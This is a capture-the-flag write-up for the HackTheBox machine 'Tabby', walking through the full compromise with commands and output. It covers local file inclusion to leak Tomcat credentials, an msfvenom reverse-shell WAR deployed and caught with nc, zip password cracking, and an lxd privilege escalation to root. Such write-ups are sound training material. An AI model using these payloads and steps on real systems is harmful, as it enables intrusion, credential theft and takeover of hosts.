---
layout: default
title:  "HackTheBox guide - Tabby"
date:   2020-11-08 12:20:00 +0100
categories: HackTheBox
---

# **HackTheBox: Tabby**
* Operating System: *Linux*<br>
* Created by:  [*egre55*](https://app.hackthebox.eu/users/1190)<br>

## **Solution Summary**

### User Flag:
1. PHP Local File Inclusion to leak Tomcat admin credentials
 - `curl http://10.10.10.194/news.php?file=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml`
2. Use of Tomcat admin credentials to upload and execute reverse shell as `.war` payload
 - Create:<br>`msfvenom -p java/jsp_shell_reverse_tcp LHOST=[YOUR IP ADDRESS] LPORT=1337 -f war > shell.war`
 - Upload:<br>`curl -u 'tomcat':'$3cureP4s5w0rd123!' --upload-file shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/shell'`
 - Execute:<br>`http://10.10.10.194/shell`<br>(navigate to or `wget` the above)
3. Weak password on backup zip file in `/var/www/html/files` re-used for user `ash`
4. User flag located in `/home/ash`

### System Flag:
1. User ash is part of group `lxd` meaning we can interact with Linux Containers on the system
2. Perform an [`lxd` Privilege Escalation](https://www.exploit-db.com/exploits/46978) by building Alpine Linux on your attacking machine, transferring it to Tabby and running the linked exploit on Tabby.
3. System flag is readable from within the newly spawned container at `/mnt/root/root`

## **Full Walkthrough**


## --------<br>User Flag<br>--------


An nmap of the remote host reveals several open ports:

```
$ nmap 10.10.10.194

Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-07 05:00 EST
Nmap scan report for 10.10.10.194
Host is up (0.029s latency).
Not shown: 996 closed ports

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
8081/tcp open  blackice-icecap

Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds
```
### **80/tcp   open  http**

Start by visiting the http server in your browser. We are greeted with the following home page:

![1-enum-http-1-homepage]

Observe the link to a statement about recovering from a data breach. Clicking it takes us to a 404 under the domain `megahosting.htb`, but if we switch it the host's IP address, the statement will load:

`http://10.10.10.194/news.php?file=statement`

![1-enum-http-2-possible-LFI]

The url here is a big red flag and hints to a possible Local File Inclusion vulnerability. If the php file `news.php` arbitrarily loads any file fed in through the `file` parameter, we could leak all sorts of information from the server to help our malicous intentions. Lets test this on the `etc/hosts` file.

`http://10.10.10.194/news.php?file=../../../../../etc/hosts`

![1-enum-http-3-LFI-confirmed]

This is our first foothold. We will want to use this LFI vulnerability to try and leak configuration information from the machine. Lets put a pin in this vector and continue to investigate the other open ports found with `nmap`
<br><br>

### **8080/tcp   open  http-proxy**

Visiting this port in the browser reveals a [tomcat](https://en.wikipedia.org/wiki/Apache_Tomcat) default landing page.

![2-enum-tomcat-1-default-page]

Several important bits of information have been leaked here:

- `CATALINA_HOME` is `/usr/share/tomcat9`
- `CATALINA_BASE` is `/var/lib/tomcat9`

If the mentioned **tomcat9-admin** package is installed, if we can access this, we could possibly upload and execute a [`.war`](https://en.wikipedia.org/wiki/WAR_(file_format)) file to get a reverse shell. 

Upon clicking the link to the manager webapp, we are greeted with a `401 Unauthorized` error. The error page reveals that the credentials are, however, stored somewhere on disk (see the red in the below image)

![2-enum-tomcat-2-manager-401-error]

Further research on the internet as well as knowing the `CATALINA_HOME` path, and a fair amount of trial and error, leads us to the location of `tomcat-users.xml` as `/usr/share/tomcat9/etc/tomcat-users.xml`.

We can disclose this important configuration file using the LFI vulnerability found through the `news.php` page on the webserver on port 80. Use curl as below:

```
$ curl http://10.10.10.194/news.php?file=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
.
. (output truncated)
.
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
.
. (output truncated)
.
```

Emphasis on this line: `<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>`

Now we know the password and username for the manager webapp we can test to see if there is a deploy command available. See documentation for this [here](https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html#Supported_Manager_Commands).


```
$ curl -u 'tomcat':'$3cureP4s5w0rd123!' 'http://10.10.10.194:8080/manager/text/deploy'

FAIL - Invalid parameters supplied for command [/deploy]
```

This error means that there is indeed a deploy command we can use! All that remains to do is to generate a payload as a `.war` file, send it to the server and run it to get a reverse shell. Generate the payload in `msfvenom` as follows:

```
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=[YOUR IP ADDRESS] LPORT=1337 -f war > shell.war
Payload size: 1090 bytes
Final size of war file: 1090 bytes
```

Send it with:

```
$ curl -u 'tomcat':'$3cureP4s5w0rd123!' --upload-file shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/shell'

OK - Deployed application at context path [/shell]
```

Finally, listen on the `LPORT` specified in the `msfvenom` command through `nc` on your attacking machine, once you have it listening on the right port, navigate to the payload you just uploaded at `http://10.10.10.194:8080/shell` to trigger the reverse shell

```
$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.194] 44190

```
hey presto, you have a reverse shell. You can follow the guides on how to upgrade to an interactive prompt [here](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/).

So we have a reverse shell as the user `tomcat`, which doesn't appear to have access to the user flag. Further exploration of the file system reveals a backup zip file called `16162020_backup.zip` in `/var/www/html/files`. Checking the owner, we see it belongs to the user `ash`

```
$ ls -ahl 16162020_backup.zip 
-rw-r--r-- 1 ash ash 8.6K Jun 16 13:42 16162020_backup.zip
```

But upon unzipping it, we find it is password protected. From your attacking machine, download it and run it through either `fcrackzip` or `zip2john` then `john` with the `rockyou` wordlist file.

```
$ wget -q http://10.10.10.194/files/16162020_backup.zip
$ fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip 
'var/www/html/assets/' is not encrypted, skipping
found file 'var/www/html/favicon.ico', (size cp/uc    338/   766, flags 9, chk 7db5)
'var/www/html/files/' is not encrypted, skipping
found file 'var/www/html/index.php', (size cp/uc   3255/ 14793, flags 9, chk 5935)
found file 'var/www/html/logo.png', (size cp/uc   2906/  2894, flags 9, chk 5d46)
found file 'var/www/html/news.php', (size cp/uc    114/   123, flags 9, chk 5a7a)
found file 'var/www/html/Readme.txt', (size cp/uc    805/  1574, flags 9, chk 6a8b)
checking pw arizon1                                 

PASSWORD FOUND!!!!: pw == admin@it

```

The zip is successfully cracked and, as luck would have it, the user `ash` has re-used their password to encrypt the zip file. Log into Ash's account with `su ash`, input the password `admin@it` and find the user flag at `cat /home/ash/user.txt`

 
## --------<br>**System Flag**<br>--------

Using the `id` command, we see that `ash` is a member of the `lxd` group. [LXD](https://linuxcontainers.org/lxd/) is essentially a container manager, which means that the user `ash` can create and manage Linux Containers. This is a possible privilege escalation as LXD is a system level process. It is documented [here](https://www.exploit-db.com/exploits/46978).

As described in the exploit, on your attacking machine, download the alpine-linux-builder and build it as root. (NOTE: If you have trouble, switch to `root`'s home directory and build it there)

```
root@kali:~# wget -q https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine

root@kali:~# bash build-alpine 

Determining the latest release... v3.12
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64
Downloading alpine-mirrors-3.5.10-r0.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading alpine-keys-2.2-r0.apk
Downloading apk-tools-static-2.10.5-r1.apk
alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: OK
Verified OK
Selecting mirror http://mirror.neostrada.nl/alpine/v3.12/main
fetch http://mirror.neostrada.nl/alpine/v3.12/main/x86_64/APKINDEX.tar.gz
(1/19) Installing musl (1.1.24-r6)
(2/19) Installing busybox (1.31.1-r15)
Executing busybox-1.31.1-r15.post-install
.
. (truncated)
.
(17/19) Installing libc-utils (0.7.2-r3)
(18/19) Installing alpine-keys (2.2-r0)
(19/19) Installing alpine-base (3.12_alpha20200428-r0)
Executing busybox-1.31.1-r15.trigger
OK: 8 MiB in 19 packages
```
Next, download the script from exploit DB and make sure to remove any `\r` characters:

`$ sed -i 's/\r$//g' lxd_privesc.sh`

Transfer the created `.tar.gz` archive to Tabby as well as the privilege escalation script from exploit DB. Then run the exploit on the victim machine.

```
ash@tabby:~$ bash lxd_privesc.sh -f alpine-v3.12-x86_64-20201112_1734.tar.gz

If this is your first time running LXD on this machine, you should also run: lxd init
To start your first instance, try: lxc launch ubuntu:18.04

[*] Listing images...

+--------+--------------+--------+-------------------------------+--------------+-----------+--------+-------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |          UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+-------------------------------+
| alpine | 57f74df4f94a | no     | alpine v3.12 (20201112_17:34) | x86_64       | CONTAINER | 3.05MB | Nov 12, 2020 at 11:28pm (UTC) |
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+-------------------------------+
Creating privesc
Device giveMeRoot added to privesc
~ # whoami
root
~ # ls /mnt/root/root
root.txt  snap
~ # 
```

The file system of the victim machine has been mounted in the `/mnt` directory of the Linux Container we just created, in which we have root. Getting the system flag is as simple as reading it from the `/mnt/root/root` directory from within the container.



[1-enum-http-1-homepage]: /assets/images/htb/machines/tabby/1-enum-http-1-homepage.png
[1-enum-http-2-possible-LFI]: /assets/images/htb/machines/tabby/1-enum-http-2-possible-LFI.png
[1-enum-http-3-LFI-confirmed]: /assets/images/htb/machines/tabby/1-enum-http-3-LFI-confirmed.png
[2-enum-tomcat-1-default-page]: /assets/images/htb/machines/tabby/2-enum-tomcat-1-default-page.png
[2-enum-tomcat-2-manager-401-error]: /assets/images/htb/machines/tabby/2-enum-tomcat-2-manager-401-error.png